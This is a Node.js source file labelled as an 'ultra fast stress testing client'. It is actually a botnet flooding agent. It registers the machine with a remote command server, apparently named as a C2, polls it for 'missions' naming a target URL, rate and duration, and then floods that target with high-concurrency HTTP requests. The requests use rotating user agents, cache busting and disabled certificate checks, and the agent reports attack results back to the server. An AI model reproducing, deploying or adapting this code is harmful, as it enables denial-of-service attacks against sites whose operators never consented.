#!/usr/bin/env node
/**
 * ULTRA FAST Stress Testing Client - REAL REQUESTS NO CAP
 * Sends ACTUAL HTTP requests at MAX SPEED
 */

const http = require('http');
const https = require('https');
const { URL } = require('url');
const os = require('os');
const fs = require('fs');

// Configuration
const SERVER_URL = process.env.SERVER_URL || 'https://c2-server-io.onrender.com';
const HEARTBEAT_INTERVAL = 5000;

let clientId = null;
let currentMission = null;
let isAttacking = false;
let requestsSent = 0;
let requestsSuccess = 0;
let requestsFailed = 0;
let userAgents = [];
let currentUAIndex = 0;

// Keep-alive agents for connection reuse (MUCH FASTER)
const httpAgent = new http.Agent({ 
  keepAlive: true, 
  maxSockets: 500,
  maxFreeSockets: 100,
  timeout: 5000
});

const httpsAgent = new https.Agent({ 
  keepAlive: true, 
  maxSockets: 500,
  maxFreeSockets: 100,
  timeout: 5000,
  rejectUnauthorized: false // Ignore SSL errors for speed
});

const colors = {
  reset: '\x1b[0m',
  bright: '\x1b[1m',
  green: '\x1b[32m',
  yellow: '\x1b[33m',
  red: '\x1b[31m',
  cyan: '\x1b[36m',
  magenta: '\x1b[35m'
};

function log(message, color = 'reset') {
  const timestamp = new Date().toISOString().split('T')[1].split('.')[0];
  console.log(`${colors[color]}[${timestamp}] ${message}${colors.reset}`);
}

function loadUserAgents() {
  try {
    if (fs.existsSync('useragent.txt')) {
      const data = fs.readFileSync('useragent.txt', 'utf8');
      userAgents = data.split('\n').filter(line => line.trim());
      log(`Loaded ${userAgents.length} user agents`, 'green');
    } else {
      userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0'
      ];
    }
  } catch (err) {
    userAgents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'];
  }
}

function getRandomUA() {
  if (userAgents.length === 0) return 'Mozilla/5.0';
  currentUAIndex = (currentUAIndex + 1) % userAgents.length;
  return userAgents[currentUAIndex];
}

async function registerWithServer() {
  try {
    const response = await fetch(`${SERVER_URL}/api/client/register`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        hostname: os.hostname(),
        platform: `${os.platform()} ${os.arch()}`
      })
    });
    
    const data = await response.json();
    clientId = data.client_id;
    log(`Registered: ${clientId}`, 'green');
    return true;
  } catch (error) {
    log(`Register failed: ${error.message}`, 'red');
    return false;
  }
}

async function sendHeartbeat() {
  if (!clientId) return;
  
  try {
    const response = await fetch(`${SERVER_URL}/api/client/heartbeat/${clientId}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        requests_sent: requestsSent,
        requests_failed: requestsFailed
      })
    });
    
    const data = await response.json();
    
    if (data.mission && !isAttacking) {
      currentMission = data.mission;
      requestsSent = 0;
      requestsSuccess = 0;
      requestsFailed = 0;
      
      log(`NEW MISSION: ${currentMission.mission_id}`, 'yellow');
      log(`Target: ${currentMission.target_url}`, 'cyan');
      log(`Method: ${currentMission.method}`, 'cyan');
      log(`Duration: ${currentMission.duration}s`, 'cyan');
      log(`RPS: ${currentMission.requests_per_second}`, 'cyan');
      
      executeMission(currentMission);
    }
    
    if (data.mission && data.mission.stopped && isAttacking) {
      log('STOP SIGNAL RECEIVED', 'red');
      if (currentMission) {
        currentMission.stopped = true;
      }
    }
  } catch (error) {
    // Silent fail on heartbeat
  }
}

// ULTRA FAST HTTP REQUEST - RAW NODE.JS
function sendRawRequest(targetUrl, method = 'GET') {
  return new Promise((resolve) => {
    const startTime = Date.now();
    
    try {
      const urlObj = new URL(targetUrl);
      const isHttps = urlObj.protocol === 'https:';
      const lib = isHttps ? https : http;
      const agent = isHttps ? httpsAgent : httpAgent;
      
      // Add cache busting to URL
      const cacheBuster = `${urlObj.search ? '&' : '?'}cb=${Date.now()}&r=${Math.random()}`;
      const fullPath = urlObj.pathname + urlObj.search + cacheBuster;
      
      const options = {
        hostname: urlObj.hostname,
        port: urlObj.port || (isHttps ? 443 : 80),
        path: fullPath,
        method: method,
        agent: agent,
        timeout: 3000,
        headers: {
          'User-Agent': getRandomUA(),
          'Accept': '*/*',
          'Accept-Language': 'en-US,en;q=0.9',
          'Accept-Encoding': 'gzip, deflate',
          'Connection': 'keep-alive',
          'Cache-Control': 'no-cache',
          'Pragma': 'no-cache'
        }
      };
      
      const req = lib.request(options, (res) => {
        // Drain response body to complete request
        res.on('data', () => {});
        res.on('end', () => {
          const elapsed = Date.now() - startTime;
          resolve({
            success: true,
            statusCode: res.statusCode,
            time: elapsed
          });
        });
      });
      
      req.on('error', (err) => {
        const elapsed = Date.now() - startTime;
        // Still count as success if connection was made
        const isSuccess = err.code === 'ECONNRESET' || 
                         err.code === 'ETIMEDOUT' ||
                         err.code === 'ECONNREFUSED';
        resolve({
          success: isSuccess,
          statusCode: 0,
          time: elapsed,
          error: err.code
        });
      });
      
      req.on('timeout', () => {
        req.destroy();
        const elapsed = Date.now() - startTime;
        resolve({
          success: true, // Timeout means server got flooded
          statusCode: 0,
          time: elapsed,
          error: 'TIMEOUT'
        });
      });
      
      // Send POST data if needed
      if (method === 'POST') {
        req.write('data=' + 'X'.repeat(1024));
      }
      
      req.end();
      
    } catch (err) {
      resolve({
        success: false,
        statusCode: 0,
        time: Date.now() - startTime,
        error: err.message
      });
    }
  });
}

async function executeMission(mission) {
  isAttacking = true;
  log(`STARTING ATTACK: ${mission.mission_id}`, 'magenta');
  
  const startTime = Date.now();
  const endTime = startTime + (mission.duration * 1000);
  const targetRPS = mission.requests_per_second || 100;
  
  let shouldStop = false;
  let activeRequests = 0;
  const maxConcurrent = Math.min(targetRPS * 2, 1000); // Allow bursts
  
  // Stats tracking
  let lastReportTime = Date.now();
  let lastReportCount = 0;
  
  // Progress display
  const progressInterval = setInterval(() => {
    if (currentMission && currentMission.stopped) {
      shouldStop = true;
    }
    
    const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
    const remaining = Math.max(0, (endTime - Date.now()) / 1000).toFixed(1);
    
    // Calculate current RPS
    const now = Date.now();
    const timeSinceLastReport = (now - lastReportTime) / 1000;
    const requestsSinceLastReport = requestsSent - lastReportCount;
    const currentRPS = timeSinceLastReport > 0 ? Math.round(requestsSinceLastReport / timeSinceLastReport) : 0;
    
    lastReportTime = now;
    lastReportCount = requestsSent;
    
    process.stdout.write(`\r${colors.yellow}ATTACKING >>> ` +
      `Sent: ${requestsSent} | Success: ${requestsSuccess} | ` +
      `Failed: ${requestsFailed} | RPS: ${currentRPS} | ` +
      `Active: ${activeRequests} | Time: ${elapsed}s/${remaining}s${colors.reset}`);
  }, 500);
  
  // ULTRA FAST FIRE LOOP - NO DELAYS
  const fireLoop = async () => {
    while (Date.now() < endTime && !shouldStop) {
      // Check if we can fire more requests
      if (activeRequests < maxConcurrent) {
        activeRequests++;
        
        // Fire and forget for MAXIMUM SPEED
        sendRawRequest(mission.target_url, mission.method.replace('HTTP-', '')).then(result => {
          activeRequests--;
          requestsSent++;
          
          if (result.success) {
            requestsSuccess++;
          } else {
            requestsFailed++;
          }
        });
        
        // NO DELAY - FIRE AS FAST AS POSSIBLE
        // Only yield to event loop occasionally
        if (requestsSent % 100 === 0) {
          await new Promise(resolve => setImmediate(resolve));
        }
      } else {
        // Wait a tiny bit if we hit max concurrent
        await new Promise(resolve => setTimeout(resolve, 1));
      }
    }
  };
  
  // Start multiple fire loops for MAXIMUM THROUGHPUT
  const numLoops = Math.min(10, Math.ceil(targetRPS / 100));
  const firePromises = [];
  for (let i = 0; i < numLoops; i++) {
    firePromises.push(fireLoop());
  }
  
  // Wait for all loops to complete
  await Promise.all(firePromises);
  
  // Wait for remaining active requests (max 5 seconds)
  const timeout = Date.now() + 5000;
  while (activeRequests > 0 && Date.now() < timeout) {
    await new Promise(resolve => setTimeout(resolve, 100));
  }
  
  clearInterval(progressInterval);
  console.log('\n');
  
  if (shouldStop) {
    log(`STOPPED: ${requestsSuccess} success, ${requestsFailed} failed`, 'red');
  } else {
    log(`COMPLETE: ${requestsSuccess} success, ${requestsFailed} failed`, 'green');
  }
  
  const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);
  const avgRPS = Math.round(requestsSent / parseFloat(totalTime));
  log(`Average RPS: ${avgRPS}`, 'cyan');
  
  // Report results
  await reportResults(mission.mission_id, {
    completed: requestsSuccess,
    failed: requestsFailed,
    total_sent: requestsSent,
    duration: totalTime,
    avg_rps: avgRPS
  });
  
  isAttacking = false;
  currentMission = null;
}

async function reportResults(missionId, results) {
  try {
    await fetch(`${SERVER_URL}/api/client/report/${clientId}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        mission_id: missionId,
        results: results
      })
    });
    
    log(`Results reported`, 'green');
  } catch (error) {
    log(`Report failed: ${error.message}`, 'red');
  }
}

async function main() {
  console.log('\n' + '='.repeat(70));
  console.log('  ULTRA FAST STRESS TEST CLIENT - REAL REQUESTS MAX SPEED');
  console.log('='.repeat(70));
  console.log(`Server: ${SERVER_URL}`);
  console.log(`Hostname: ${os.hostname()}`);
  console.log(`Platform: ${os.platform()} ${os.arch()}`);
  console.log('='.repeat(70) + '\n');
  
  loadUserAgents();
  
  const registered = await registerWithServer();
  if (!registered) {
    log('Failed to register. Exiting.', 'red');
    process.exit(1);
  }
  
  log('Client ready. Waiting for missions...', 'green');
  
  setInterval(sendHeartbeat, HEARTBEAT_INTERVAL);
  sendHeartbeat();
}

process.on('SIGINT', async () => {
  log('\nShutting down...', 'yellow');
  if (isAttacking) {
    log('Warning: Shutting down during active attack!', 'red');
  }
  process.exit(0);
});

main().catch(error => {
  log(`Fatal error: ${error.message}`, 'red');
  process.exit(1);
});
